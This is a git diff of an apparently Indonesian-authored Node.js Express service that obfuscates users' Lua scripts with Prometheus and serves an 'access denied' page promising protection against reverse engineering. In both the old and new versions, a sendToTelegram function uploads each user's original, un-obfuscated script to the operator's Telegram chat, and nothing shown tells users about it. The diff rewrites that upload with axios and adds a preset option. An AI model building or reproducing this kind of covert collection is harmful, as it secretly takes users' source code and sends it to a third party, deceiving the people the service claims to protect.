@@ -4,7 +4,7 @@ const { exec } = require('child_process');
 const fs = require('fs');
 const path = require('path');
 const FormData = require('form-data');
-const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
+const axios = require('axios');
 const app = express();
 app.use(cors());
 app.use(express.json());
@@ -12,17 +12,13 @@ app.use(express.static('public'));
 
 // ============================================================
 // TELEGRAM CONFIG
-// Isi via Railway Environment Variables (lebih aman)
-// Key: TG_BOT_TOKEN dan TG_CHAT_ID
+// Set via Railway Environment Variables
 // ============================================================
-const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || 'ISI_BOT_TOKEN_KAMU';
-const TG_CHAT_ID   = process.env.TG_CHAT_ID   || 'ISI_CHAT_ID_KAMU';
+const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN;
+const TG_CHAT_ID   = process.env.TG_CHAT_ID;
 
 async function sendToTelegram(originalScript, scriptId, loaderString) {
     try {
-        const TG_API = `https://api.telegram.org/bot${TG_BOT_TOKEN}`;
-
-        // Kirim script asli sebagai file .lua + caption info
         const form = new FormData();
         form.append('chat_id', TG_CHAT_ID);
         form.append('parse_mode', 'Markdown');
@@ -37,16 +33,19 @@ async function sendToTelegram(originalScript, scriptId, loaderString) {
             { filename: `original_${scriptId}.lua`, contentType: 'text/plain' }
         );
 
-        const res  = await fetch(`${TG_API}/sendDocument`, { method: 'POST', body: form });
-        const json = await res.json();
+        const res = await axios.post(
+            `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendDocument`,
+            form,
+            { headers: form.getHeaders() }
+        );
 
-        if (!json.ok) {
-            console.error('[Telegram] Gagal kirim:', json.description);
+        if (res.data.ok) {
+            console.log(`[Telegram] ✓ Log terkirim — ID: ${scriptId}`);
         } else {
-            console.log(`[Telegram] Log terkirim ✓ ID: ${scriptId}`);
+            console.error('[Telegram] Gagal:', res.data.description);
         }
     } catch (err) {
-        console.error('[Telegram] Error:', err.message);
+        console.error('[Telegram] Error:', err.response?.data || err.message);
     }
 }
 
@@ -97,7 +96,7 @@ const ACCESS_DENIED_HTML = `<!DOCTYPE html>
   <div class="bg-text"><div class="bg-text-inner" id="bg"></div></div>
   <div class="card">
     <div class="badge"><span class="dot"></span>ACCESS DENIED</div>
-    <h1>This lua script is protected by rzprivate Developments</h1>
+    <h1>This lua script is protected by Junkie Developments</h1>
     <div class="divider"></div>
     <p>You don't have permission to access these files.</p>
     <p>This script has been protected against unauthorized access, reverse engineering, and tampering.</p>
@@ -119,7 +118,11 @@ const ACCESS_DENIED_HTML = `<!DOCTYPE html>
 // ============================================================
 // FUNGSI UTAMA PROMETHEUS
 // ============================================================
-function obfuscateWithPrometheus(scriptContent) {
+function obfuscateWithPrometheus(scriptContent, preset = 'Medium') {
+    // Validasi preset yang diizinkan
+    const allowedPresets = ['Minify', 'Weak', 'Medium', 'Strong'];
+    if (!allowedPresets.includes(preset)) preset = 'Medium';
+
     return new Promise((resolve, reject) => {
         const tempId = Date.now();
         const inputPath = path.join(tempDir, `input_${tempId}.lua`);
@@ -128,7 +131,7 @@ function obfuscateWithPrometheus(scriptContent) {
         fs.writeFileSync(inputPath, scriptContent);
 
         const prometheusPath = path.join(__dirname, '../Prometheus/cli.lua');
-        const command = `lua5.3 "${prometheusPath}" --preset Medium "${inputPath}"`;
+        const command = `lua5.3 "${prometheusPath}" --preset ${preset} "${inputPath}"`;
 
         console.log("Menjalankan command:", command);
 
@@ -159,12 +162,12 @@ function obfuscateWithPrometheus(scriptContent) {
 // ENDPOINT OBFUSCATE
 // ============================================================
 app.post('/api/obfuscate', async (req, res) => {
-    const { script } = req.body;
+    const { script, preset } = req.body;
     if (!script) return res.status(400).json({ error: "Script kosong!" });
 
     try {
-        console.log("Menerima request obfuscate...");
-        const obfuscatedCode = await obfuscateWithPrometheus(script);
+        console.log(`Menerima request obfuscate... Preset: ${preset || 'Medium'}`);
+        const obfuscatedCode = await obfuscateWithPrometheus(script, preset);
 
         const scriptId = Math.floor(Math.random() * 10000000000000).toString();
         scriptDatabase.set(scriptId, obfuscatedCode);
